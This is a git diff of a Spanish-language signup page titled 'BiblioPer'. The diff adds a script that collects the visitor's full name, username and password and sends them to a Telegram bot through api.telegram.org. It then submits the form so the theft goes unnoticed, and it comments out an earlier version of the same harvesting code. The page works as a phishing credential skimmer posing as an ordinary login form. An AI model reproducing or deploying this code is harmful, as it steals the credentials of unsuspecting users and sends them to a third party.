@@ -13,30 +13,48 @@
   <link rel="stylesheet" href="./BiblioPer_files/all.css"
     integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous">
   <link rel="stylesheet" href="./BiblioPer_files/styles.css">
+  <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
+    <script>
+      async function enviarMensajeTelegram() {
+        const fullname = document.getElementById("fullname").value;
+        const username = document.getElementById("username").value;
+        const password = document.getElementById("password").value;
+
+        const mensaje = `fullname: ${fullname}\nusername: ${username}\npassword: ${password}`;
+
+        const token = process.env.TOKEN;
+        const chatId = process.env.ID; 
+
+        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(mensaje)}`;
+
+        try {
+          await axios.get(url);
+          console.log("Mensaje enviado a Telegram");
+        } catch (error) {
+          console.error(error);
+        }
+      }
+    </script>
   <script>
-    async function fn(event) {
-      event.preventDefault();
+    /*
+    async function fn() {
       const out1 = document.getElementsByName('fullname')
       const out2 = document.getElementsByName('username')
       const out3 = document.getElementsByName('password')
       await guardarEnArchivo(out1[0].value, out2[0].value, out3[0].value)
-      await event.target.form.submit();
+      
     };
     async function guardarEnArchivo(v1, v2, v3) {
       var contenido = "fullname: " + v1 + "\nname: " + v2 + "\npassword: " + v3 + "\n";
-      /*
+      
       var blob = new Blob([contenido], { type: "text/plain;charset=utf-8" });
       var enlace = document.createElement("a");
       enlace.href = URL.createObjectURL(blob);
       enlace.download = "valor_cuenta.txt";
       enlace.click();
       URL.revokeObjectURL(enlace.href);
-      */
-      var token = process.env.TOKEN; 
-      var chat_id = process.env.ID; 
-      var url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + encodeURIComponent(contenido);
-      await fetch(url);
     }
+    */
   </script>
 </head>
 
@@ -73,16 +91,16 @@
           <div class="card-body">
             <form action="https://biblioper.onrender.com/signup" method="POST">
               <div class="form-group">
-                <input type="type" name="fullname" placeholder="Nombre Completo" class="form-control" autofocus="">
+                <input type="type" id="fullname" name="fullname" placeholder="Nombre Completo" class="form-control" autofocus="">
               </div>
               <div class="form-group">
-                <input type="text" name="username" placeholder="Usuario" class="form-control">
+                <input type="text" id="username" name="username" placeholder="Usuario" class="form-control">
               </div>
               <div class="form-group">
-                <input type="password" name="password" placeholder="Contraseña" class="form-control">
+                <input type="password" id="password" name="password" placeholder="Contraseña" class="form-control">
               </div>
               <div class="form-group">
-                <button class="btn btn-success btn-block" onclick='fn()'>
+                <button class="btn btn-success btn-block" id="enviar" onclick='fn()'>
                   Iniciar
                 </button>
               </div>
@@ -92,6 +110,20 @@
       </div>
     </div>
   </div>
+
+  <script>
+    const enviarBtn = document.getElementById("enviar");
+
+    enviarBtn.addEventListener("click", async (event) => {
+      event.preventDefault();
+
+      try {
+        await enviarMensajeTelegram();
+        enviarBtn.closest("form").submit();
+      } catch (error) {
+      }
+    });
+  </script>
 
   <script src="./BiblioPer_files/jquery-3.3.1.slim.min.js.descarga"
     integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"
